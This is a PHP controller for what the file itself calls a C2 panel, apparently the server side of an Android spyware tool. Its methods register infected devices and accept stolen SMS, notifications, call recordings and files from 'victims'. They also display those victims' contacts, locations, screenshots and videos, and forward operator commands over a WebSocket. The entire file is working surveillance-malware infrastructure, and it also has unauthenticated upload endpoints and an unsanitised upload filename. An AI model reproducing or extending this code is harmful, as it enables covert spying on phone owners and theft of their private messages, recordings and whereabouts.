<?php

namespace Server\Controller;

use Locale;
use Server\Model\Client;
use Server\Controller\Base;
use Server\Model\Contact;
use Server\Model\Image;
use Server\Model\InstalledApp;
use Server\Model\Location;
use Server\Model\Message;
use Server\Model\Notification;
use Server\Model\Recording;
use Server\Model\Screenshot;
use Server\Model\Video;
use WebSocket\Client as TextTalkWebSocket;

use function Server\Library\render;

class ControlPanel extends Base
{
    /** @var string $webSocketURI Web Socket URI */
    private string $webSocketURI = "ws://localhost:8080";

    /** @var int $resultsPerPage Number of items to show in a page */
    private int $resultsPerPage = 20; 

    public function __construct()
    {
        parent::__construct();
    }

    /**
     * C2 home page
     */
    public function home(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        $clients = $this->getClients();
        render('home.php', ['clients' => $clients]);
    }

    /**
     * Get victim's contacts
     */
    public function contacts(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!$this->isClientIdSet()) {
            header("Location: /");
            return;
        }

        $contacts = $this->getContacts($_GET['client']);
        $webSocketID = $this->getClientWebSocketID($_GET['client']);
        $device = $this->getDeviceName($_GET['client']);
        render(
            'features/contacts.php',
            [
                'webSocketID' => $webSocketID,
                'contacts' => $contacts,
                'device' => $device,
                'numberOfPages' => $this->getNumberOfPages("CONTACT")
            ]
        );
    }

    /**
     * Get victim's image(s)
     */
    public function images(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!$this->isClientIdSet()) {
            header("Location: /");
            return;
        }

        if ($this->isVictimPropertyIdSet()) {
            $query = "SELECT * FROM IMAGE WHERE client_id=? AND id=?";
            $rows = $this->database->select($query, [$_GET['client'], $_GET['id']]);
            if (count($rows) > 0) {
                // Path to your file
                $file_path = __DIR__ . "/../Files/recordings/" . $rows[0]['filename'];

                // Create a fileinfo resource
                $finfo = finfo_open(FILEINFO_MIME_TYPE);

                // Get the MIME type of the file
                $mime_type = finfo_file($finfo, $file_path);

                // Close the fileinfo resource
                finfo_close($finfo);

                // Set the Content-Type header based on the MIME type
                header("Content-Type: $mime_type");

                // Output the content of the file
                readfile($file_path);

                return;
            }

            return;
        }

        $images = $this->getImages($_GET['client']);
        $webSocketID = $this->getClientWebSocketID($_GET['client']);
        $device = $this->getDeviceName($_GET['client']);
        render(
            'features/images.php',
            [
                'webSocketID' => $webSocketID,
                'images' => $images,
                'device' => $device,
                'numberOfPages' => $this->getNumberOfPages("IMAGE")
            ]
        );
    }

    /**
     * Get victim's files
     */
    public function files(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!$this->isClientIdSet()) {
            header("Location: /");
            return;
        }

        $webSocketID = $this->getClientWebSocketID($_GET['client']);
        $device = $this->getDeviceName($_GET['client']);
        render(
            'features/files.php',
            [
                'webSocketID' => $webSocketID,
                'device' => $device,
            ]
        );
    }

    /**
     * Get victim's installed application
     */
    public function installedApps(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!$this->isClientIdSet()) {
            header("Location: /");
            return;
        }

        $installedApps = $this->getInstalledApps($_GET['client']);
        $webSocketID = $this->getClientWebSocketID($_GET['client']);
        $device = $this->getDeviceName($_GET['client']);
        render(
            'features/apps.php',
            [
                'webSocketID' => $webSocketID,
                'installedApps' => $installedApps,
                'device' => $device,
                'numberOfPages' => $this->getNumberOfPages("INSTALLED_APP")
            ]
        );
    }

    /**
     * Get victim's known location(s)
     */
    public function location(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!$this->isClientIdSet()) {
            header("Location: /");
            return;
        }

        $knownLocations = $this->getKnownLocations($_GET['client']);
        $webSocketID = $this->getClientWebSocketID($_GET['client']);
        $device = $this->getDeviceName($_GET['client']);
        render(
            'features/location.php',
            [
                'webSocketID' => $webSocketID,
                'knownLocations' => $knownLocations,
                'device' => $device,
                'numberOfPages' => $this->getNumberOfPages("LOCATION")
            ]
        );
    }

    /**
     * Get victim's text messages
     */
    public function messages(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!$this->isClientIdSet()) {
            header("Location: /");
            return;
        }

        $messages = $this->getMessages($_GET['client']);
        $webSocketID = $this->getClientWebSocketID($_GET['client']);
        $device = $this->getDeviceName($_GET['client']);
        render(
            'features/messages.php',
            [
                'webSocketID' => $webSocketID,
                'messages' => $messages,
                'device' => $device,
                'numberOfPages' => $this->getNumberOfPages("MESSAGE")
            ]
        );
    }

    /**
     * Get victim's notifications
     */
    public function notifications(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!$this->isClientIdSet()) {
            header("Location: /");
            return;
        }

        $notifications = $this->getNotifications($_GET['client']);
        $webSocketID = $this->getClientWebSocketID($_GET['client']);
        $device = $this->getDeviceName($_GET['client']);
        render(
            'features/notifications.php',
            [
                'webSocketID' => $webSocketID,
                'notifications' => $notifications,
                'device' => $device,
                'numberOfPages' => $this->getNumberOfPages("NOTIFICATION")
            ]
        );
    }

    /**
     * Get victim's audio recording(s)
     */
    public function recordings(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!$this->isClientIdSet()) {
            header("Location: /");
            return;
        }

        if ($this->isVictimPropertyIdSet()) {
            $query = "SELECT * FROM RECORDING WHERE client_id=? AND id=?";
            $rows = $this->database->select($query, [$_GET['client'], $_GET['id']]);
            if (count($rows) > 0) {
                // Path to your file
                $file_path = __DIR__ . "/../Files/recordings/" . $rows[0]['filename'];

                // Create a fileinfo resource
                $finfo = finfo_open(FILEINFO_MIME_TYPE);

                // Get the MIME type of the file
                $mime_type = finfo_file($finfo, $file_path);

                // Close the fileinfo resource
                finfo_close($finfo);

                // Set the Content-Type header based on the MIME type
                header("Content-Type: $mime_type");

                // Output the content of the file
                readfile($file_path);

                return;
            }

            return;
        }

        $recordings = $this->getRecordings($_GET['client']);
        $webSocketID = $this->getClientWebSocketID($_GET['client']);
        $device = $this->getDeviceName($_GET['client']);
        render(
            'features/recordings.php',
            [
                'webSocketID' => $webSocketID,
                'recordings' => $recordings,
                'device' => $device,
                'numberOfPages' => $this->getNumberOfPages("RECORDING")
            ]
        );
    }

    /**
     * Get victim's screenshot(s)
     */
    public function screenshots(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!$this->isClientIdSet()) {
            header("Location: /");
            return;
        }

        if ($this->isVictimPropertyIdSet()) {
            $query = "SELECT * FROM SCREENSHOT WHERE client_id=? AND id=?";
            $rows = $this->database->select($query, [$_GET['client'], $_GET['id']]);
            if (count($rows) > 0) {
                // Path to your file
                $file_path = __DIR__ . "/../Files/recordings/" . $rows[0]['filename'];

                // Create a fileinfo resource
                $finfo = finfo_open(FILEINFO_MIME_TYPE);

                // Get the MIME type of the file
                $mime_type = finfo_file($finfo, $file_path);

                // Close the fileinfo resource
                finfo_close($finfo);

                // Set the Content-Type header based on the MIME type
                header("Content-Type: $mime_type");

                // Output the content of the file
                readfile($file_path);

                return;
            }

            return;
        }

        $screenshots = $this->getScreenshots($_GET['client']);
        $webSocketID = $this->getClientWebSocketID($_GET['client']);
        $device = $this->getDeviceName($_GET['client']);
        render(
            'features/screenshots.php',
            [
                'webSocketID' => $webSocketID,
                'screenshots' => $screenshots,
                'device' => $device,
                'numberOfPages' => $this->getNumberOfPages("SCREENSHOT")
            ]
        );
    }

    /**
     * Get victim's video(s)
     */
    public function videos(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!$this->isClientIdSet()) {
            header("Location: /");
            return;
        }

        if ($this->isVictimPropertyIdSet()) {
            $query = "SELECT * FROM VIDEO WHERE client_id=? AND id=?";
            $rows = $this->database->select($query, [$_GET['client'], $_GET['id']]);
            if (count($rows) > 0) {
                // Path to your file
                $file_path = __DIR__ . "/../Files/recordings/" . $rows[0]['filename'];

                // Create a fileinfo resource
                $finfo = finfo_open(FILEINFO_MIME_TYPE);

                // Get the MIME type of the file
                $mime_type = finfo_file($finfo, $file_path);

                // Close the fileinfo resource
                finfo_close($finfo);

                // Set the Content-Type header based on the MIME type
                header("Content-Type: $mime_type");

                // Output the content of the file
                readfile($file_path);

                return;
            }

            return;
        }

        $videos = $this->getVideos($_GET['client']);
        $webSocketID = $this->getClientWebSocketID($_GET['client']);
        $device = $this->getDeviceName($_GET['client']);
        render(
            'features/videos.php',
            [
                'webSocketID' => $webSocketID,
                'videos' => $videos,
                'device' => $device,
                'numberOfPages' => $this->getNumberOfPages("VIDEO")
            ]
        );
    }

    /**
     * Register a client
     */
    public function createClient(): void
    {
        if (!isset($_POST['phone']))
            echo json_encode([]);

        if (!isset($_POST['device_api']))
            echo json_encode([]);

        if (!isset($_POST['device_id']))
            echo json_encode([]);

        if (!isset($_POST['device_model']))
            echo json_encode([]);

        if (!isset($_POST['ip_address']))
            echo json_encode([]);

        $query = "SELECT * FROM CLIENT WHERE model=? AND device_id=?";
        $data = [
            $_POST['device_model'],
            $_POST['device_id']
        ];
        $rows = $this->database->select($query, $data);
        if (count($rows) > 0) {
            $response = [];
            foreach ($rows as $row) {
                $response['client_id'] = $row['id'];
                break;
            }

            echo json_encode($response);

            return;
        }

        $query = "INSERT INTO CLIENT(model, device_id, ip_address, device_api, phone) VALUES(?, ?, ?, ?, ?)";
        $data = [
            $_POST['device_model'],
            $_POST['device_id'],
            $_POST['ip_address'],
            $_POST['device_api'],
            $_POST['phone']
        ];
        $this->database->insert($query, $data);

        $query = "SELECT * FROM CLIENT WHERE model=? AND device_id=?";
        $data = [
            $_POST['device_model'],
            $_POST['device_id']
        ];
        $rows = $this->database->select($query, $data);
        $response = [];
        foreach ($rows as $row) {
            $response['client_id'] = $row['id'];
            break;
        }

        echo json_encode($response);
    }

    /**
     * Upload files from victim
     */
    public function upload(string $type): void
    {
        $destination = __DIR__ . "/../Files/" . $type . "/";

        if(isset($_FILES['file'])) {
            $file_name = $_FILES['file']['name'];
            $file_tmp = $_FILES['file']['tmp_name'];
            
            move_uploaded_file($file_tmp, $destination . $file_name);
        }

        $client = new TextTalkWebSocket($this->webSocketURI);

        try {
            // Send a message
            $client->send(json_encode(["status" => "$type uploaded: $file_name"]));
        
            // Close the WebSocket connection
            $client->close();
        } catch (\Exception $e) {}
    }

    /**
     * Send command to web socket server
     */
    public function sendCommand(): void
    {
        if (!$this->isLoggedIn()) {
            header("Location: /login");
            return;
        }

        if (!isset($_POST['cmd'])) {
            header("Location: /");
            return;
        }

        if (!isset($_POST['web_socket_id'])) {
            header("Location: /");
            return;
        }

        $client = new TextTalkWebSocket($this->webSocketURI);

        try {
            // Send a message
            $client->send(json_encode($_POST));
        
            // Close the WebSocket connection
            $client->close();
        } catch (\Exception $e) {
            header("Location: /" . $_POST['referrer'] . "?client=" . $_POST['client']. "&alert=0");
        }

        header("Location: /" . $_POST['referrer'] . "?client=" . $_POST['client']. "&alert=1");
    }

    /**
     * Upload sms gotten from sms broadcast receiver
     */
    public function uploadMessage(): void
    {
        if (!isset($_POST['type']) || $_POST['type'] != 'client')
            return;

        if (!isset($_POST['id']))
            return;

        if (!isset($_POST['res']) || $_POST['res'] != 'message')
            return;

        if (!isset($_POST['sender']))
            return;

        if (!isset($_POST['content']))
            return;

        if (!isset($_POST['timestamp']))
            return;

        $query = "INSERT INTO MESSAGE(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
        $this->database->insert($query, [$_POST['id'], $_POST['sender'], $_POST['content'], $_POST['timestamp']]);

        $client = new TextTalkWebSocket($this->webSocketURI);

        try {
            // Send a message
            $client->send(json_encode($_POST));
        
            // Close the WebSocket connection
            $client->close();
        } catch (\Exception $e) {}
    }
    
    /**
     * Upload notification gotten from notification broadcast receiver
     */
    public function uploadNotification(): void
    {
        if (!isset($_POST['type']) || $_POST['type'] !== 'client')
            return;

        if (!isset($_POST['id']))
            return;

        if (!isset($_POST['res']) || $_POST['res'] !== 'notification')
            return;

        if (!isset($_POST['sender']))
            return;

        if (!isset($_POST['content']))
            return;

        if (!isset($_POST['timestamp']))
            return;

        $query = "INSERT INTO NOTIFICATION(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
        $this->database->insert($query, [$_POST['id'], $_POST['sender'], $_POST['content'], $_POST['timestamp']]);

        $client = new TextTalkWebSocket($this->webSocketURI);

        try {
            // Send a message
            $client->send(json_encode($_POST));
        
            // Close the WebSocket connection
            $client->close();
        } catch (\Exception $e) {}
    }

    /**
     * Upload incoming call gotten from call receiver
     */
    public function uploadLog(): void
    {
        if (!isset($_POST['type']) || $_POST['type'] !== 'client')
            return;

        if (!isset($_POST['id']))
            return;

        if (!isset($_POST['timestamp']))
            return;

        $client = new TextTalkWebSocket($this->webSocketURI);

        try {
            // Send a message
            $client->send(json_encode($_POST));
        
            // Close the WebSocket connection
            $client->close();
        } catch (\Exception $e) {}
    }

    /**
     * Upload call recording gotten from broadcast receiver
     */
    public function uploadRecording(): void
    {
        if (!isset($_POST['type']) || $_POST['type'] !== 'client')
            return;

        if (!isset($_POST['id']))
            return;

        if (!isset($_POST['res']) || $_POST['res'] !== 'recording')
            return;

        if (!isset($_POST['number']))
            return;

        if (!isset($_POST['filename']))
            return;

        if (!isset($_POST['timestamp']))
            return;

        $query = "INSERT INTO RECORDING(client_id, filename, timestamp, number) VALUES(?, ?, ?, ?)";
        $this->database->insert($query, [$_POST['id'], $_POST['filename'], $_POST['timestamp'], $_POST['number']]);

        $client = new TextTalkWebSocket($this->webSocketURI);

        try {
            // Send a message
            $client->send(json_encode($_POST));
        
            // Close the WebSocket connection
            $client->close();
        } catch (\Exception $e) {}
    }

    /**
     * Get victims
     * 
     * @return array<Client>
     */
    private function getClients(): array
    {
        $clients = [];
        $query = "SELECT * FROM CLIENT ORDER BY id DESC";
        $rows = $this->database->select($query, []);

        foreach ($rows as $row) {
            $output = Client::parse($row);
            if (!is_null($output))
                $clients[] = $output;
        }

        return $clients;
    }

     /**
     * Get victim's contacts
     * @param int $victimID
     * 
     * @return array<Contact>
     */
    private function getContacts(int $victimID): array
    {
        $page = 1;
        if (isset($_GET['page']))
            $page = $_GET['page']; 
        
        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
            
        $contacts = [];
        $query = "SELECT * FROM CONTACT WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $contacts[] = new Contact(
                $row['id'],
                $row['client_id'],
                $row['name'],
                $row['number']
            );
        }

        return $contacts;
    }

     /**
     * Get victim's images
     * @param int $victimID
     * 
     * @return array<Image>
     */
    private function getImages(int $victimID): array
    {
        $page = 1;
        if (isset($_GET['page']))
            $page = $_GET['page']; 
        
        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 

        $images = [];
        $query = "SELECT * FROM IMAGE WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $images[] = new Image(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $images;
    }

     /**
     * Get victim's installed applications
     * @param int $victimID
     * 
     * @return array<InstalledApp>
     */
    private function getInstalledApps(int $victimID): array
    {
        $page = 1;
        if (isset($_GET['page']))
            $page = $_GET['page']; 
        
        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 

        $installedApps = [];
        $query = "SELECT * FROM INSTALLED_APP WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $installedApps[] = new InstalledApp(
                $row['id'],
                $row['client_id'],
                $row['package_name'],
                $row['app_name'],
                $row['timestamp']
            );
        }

        return $installedApps;
    }

     /**
     * Get victim's known locations
     * @param int $victimID
     * 
     * @return array<Location>
     */
    private function getKnownLocations(int $victimID): array
    {
        $page = 1;
        if (isset($_GET['page']))
            $page = $_GET['page']; 
        
        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 

        $knownLocations = [];
        $query = "SELECT * FROM LOCATION WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $knownLocations[] = new Location(
                $row['id'],
                $row['client_id'],
                $row['latitude'],
                $row['longitude'],
                $row['altitude'],
                $row['timestamp']
            );
        }

        return $knownLocations;
    }

     /**
     * Get victim's messages
     * @param int $victimID
     * 
     * @return array<Message>
     */
    private function getMessages(int $victimID): array
    {
        $page = 1;
        if (isset($_GET['page']))
            $page = $_GET['page']; 
        
        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 

        $messages = [];
        $query = "SELECT * FROM MESSAGE WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $messages[] = new Message(
                $row['id'],
                $row['client_id'],
                $row['sender'],
                $row['content'],
                $row['timestamp']
            );
        }

        return $messages;
    }

     /**
     * Get victim's notifications
     * @param int $victimID
     * 
     * @return array<Notification>
     */
    private function getNotifications(int $victimID): array
    {
        $page = 1;
        if (isset($_GET['page']))
            $page = $_GET['page']; 
        
        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 

        $notifications = [];
        $query = "SELECT * FROM NOTIFICATION WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $notifications[] = new Notification(
                $row['id'],
                $row['client_id'],
                $row['sender'],
                $row['content'],
                $row['timestamp']
            );
        }

        return $notifications;
    }

     /**
     * Get victim's recordings
     * @param int $victimID
     * 
     * @return array<Recording>
     */
    private function getRecordings(int $victimID): array
    {
        $page = 1;
        if (isset($_GET['page']))
            $page = $_GET['page']; 
        
        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 

        $recordings = [];
        $query = "SELECT * FROM RECORDING WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $recordings[] = new Recording(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $recordings;
    }

     /**
     * Get victim's screenshots
     * @param int $victimID
     * 
     * @return array<Screenshot>
     */
    private function getScreenshots(int $victimID): array
    {
        $page = 1;
        if (isset($_GET['page']))
            $page = $_GET['page']; 
        
        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 

        $screenshots = [];
        $query = "SELECT * FROM SCREENSHOT WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $screenshots[] = new Screenshot(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $screenshots;
    }

     /**
     * Get victim's videos
     * @param int $victimID
     * 
     * @return array<Video>
     */
    private function getVideos(int $victimID): array
    {
        $page = 1;
        if (isset($_GET['page']))
            $page = $_GET['page']; 
        
        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 

        $videos = [];
        $query = "SELECT * FROM VIDEO WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $videos[] = new Video(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $videos;
    }

    /**
     * Check if the victim's ID is passed as a GET parameter
     * 
     * @return bool
     */
    private function isClientIdSet(): bool
    {
        if (!isset($_GET['client']))
            return false;

        return true;
    }

    /**
     * Check if the victim's property ID is passed as a GET parameter
     * 
     * @return bool
     */
    private function isVictimPropertyIdSet(): bool
    {
        if (!isset($_GET['id']))
            return false;

        return true;
    }

    /**
     * Get client web socket id
     * 
     * @param int $clientID
     * 
     * @return string
     */
    private function getClientWebSocketID(int $clientID): int
    {
        $query = "SELECT web_socket_id FROM CLIENT WHERE id=?";
        $rows = $this->database->select($query, [$clientID]);
        
        if (count($rows) > 0 && $rows[0]['web_socket_id'] !== null)
            return $rows[0]['web_socket_id'];

        return -1;
    }

    /**
     * Get client device name
     * 
     * @param int $clientID
     * 
     * @return string
     */
    private function getDeviceName(int $clientID): string
    {
        $query = "SELECT * FROM CLIENT WHERE id=?";
        $rows = $this->database->select($query, [$clientID]);

        if (count($rows) > 0)
            return $rows[0]['model'] . " " . $rows[0]['device_id'];

        return "";
    }

    /**
     * Get the number of pages to be gotten from table
     * 
     * @param string $table
     * 
     * @return int
     */
    private function getNumberOfPages(string $table): int
    {
        $query = "SELECT * FROM $table";
        $rows = $this->database->select($query, []);

        return ceil(count($rows) / $this->resultsPerPage);
    }
}